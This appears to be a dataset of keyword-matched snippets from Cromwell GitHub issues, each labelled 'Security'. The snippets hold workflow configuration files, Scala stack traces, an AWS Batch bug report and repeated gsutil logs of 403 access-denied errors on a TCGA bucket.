Security,"orage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // This allows you to use an alternative service account to launch jobs, by default uses default service account; compute-service-account = ""default"". // Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; // There is no logic to determine if the error was transient or not, everything is retried upon failure; // Defaults to 3; localization-attempts = 3; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""xxx""; }; }; }; }; }; }; ```. I then run with th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:2136,access,access,2136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,2,['access'],['access']
Security,orkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkflowDefinition.scala:87); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$convertGraphElements$3(WorkflowDefinitionElementToWomWorkflowDefinition.scala:64); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convertGraphElements(WorkflowDefinitionElementToWomWorkflowDefinition.scala:63); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertOuterScatter$10(ScatterElementToGraphNode.scala:72); scala.Function3.$anonfun$tupled$1(Function3.scala:35); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple3$.flatMapN$extension(ErrorOr.scala:53); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convertOuterScatter(ScatterElementToGraphNode.scala:65); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convert(ScatterElementToGraphNode.scala:33); wdl.draft3.transforms.wdlom2wom.graph.WorkflowGraphElementToGraphNode$.convert(WorkflowGraphElementToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementTo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:3274,validat,validation,3274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,"ort feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. Backend: AWS Batch. <!-- Paste/Attach your workflow if possible: -->. [Workflow](https://github.com/FredHutch/workflow-manager-hackathon/blob/issue/jobdef-error/Workflow/FH-processing-for-variant-discovery-gatk4.wdl). [Input file](https://github.com/FredHutch/workflow-manager-hackathon/blob/issue/jobdef-error/Workflow/FH-M40job.inputs.json). <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. [Configuration file](https://github.com/FredHutch/workflow-manager-hackathon/blob/issue/jobdef-error/Workflow/aws.conf). Running this workflow on AWS Batch (with cromwell-36.jar) consistently fails at the same point each time. . It gets through most (looks like all but one iteration) of the scatter loop that calls the `BaseRecalibrator` task. Then cromwell just sits for a long time (~1hr) with no Batch jobs running (or runnable or starting). Then cromwell calls the `RegisterJobDefinition` API of AWS Batch, and it always fails with the following error message:. ```; 2018-12-15 23:39:03,360 cromwell-system-akka.dispatchers.backend-dispatcher-258 ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(8adb5141)PreProcessingForVariantDiscovery_GATK4.BaseRecalibrator:1:1]: Error attempting to Execute; ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(8adb5141)PreProcessingForVariantDiscovery_GATK4.BaseRecalibrator:1:1]: Error attemptin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4496:1048,PASSWORD,PASSWORDS,1048,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4496,1,['PASSWORD'],['PASSWORDS']
Security,ory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); at scala.Function0.apply$mcV$sp(Function0.scala:42); at scala.Function0.apply$mcV$sp$(Function0.scala:42); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:17); at scala.App.$anonfun$main$1(App.scala:98); at scala.App.$anonfun$main$1$adapted(App.scala:98); at scala.collection.IterableOnceOps.foreach(IterableOnce.scala:575); at scala.collection.IterableOnceOps.foreach$(IterableOnce.scala:573); at scala.collection.AbstractIterable.foreach(Iterable.scala:933); at scala.App.main(App.scala:98); at scala.App.main$(App.scala:96); at womtool.WomtoolMain$.main(WomtoolMain.scala:27); at womtool.WomtoolMain.main(WomtoolMain.scala); Caused by: com.typesafe.conf,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:3611,validat,validate,3611,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['validat'],['validate']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3700,Access,AccessDeniedException,3700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4954,Access,AccessDeniedException,4954,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6208,Access,AccessDeniedException,6208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7462,Access,AccessDeniedException,7462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8716,Access,AccessDeniedException,8716,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9970,Access,AccessDeniedException,9970,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11224,Access,AccessDeniedException,11224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assemb",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12478,Access,AccessDeniedException,12478,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"oud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13732,Access,AccessDeniedException,13732,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"ould not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remote""; enabled = ""false""; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # 